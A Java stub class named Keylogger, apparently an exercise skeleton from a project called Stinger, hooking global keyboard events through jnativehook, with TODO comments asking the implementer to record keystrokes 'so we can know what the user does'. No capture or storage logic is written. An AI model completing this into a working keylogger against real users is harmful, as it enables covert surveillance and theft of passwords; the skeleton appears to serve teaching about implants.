package stinger.os.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import stinger.StingerEnvironment;

public class Keylogger implements NativeKeyListener {
    // TODO: IMPLEMENT
    // this class is the keylogger class.
    // the methods bellow will be called when key actions are taken.
    // you need to implement them to save the key actions so we can know what the user does.
    //
    // This works with the KeyloggerStoreTask.run, which runs periodically by Stinger.
    // In it you will take the data you collected in the methods here and save them in the storage.
    //
    // You're free to do whatever as long as it works really. Just try and don't leave the
    // confines of this/KeyloggerStoreTask class.

    public Keylogger(StingerEnvironment environment) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent event) {
        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent event) {
        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent event) {
        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
    }
}
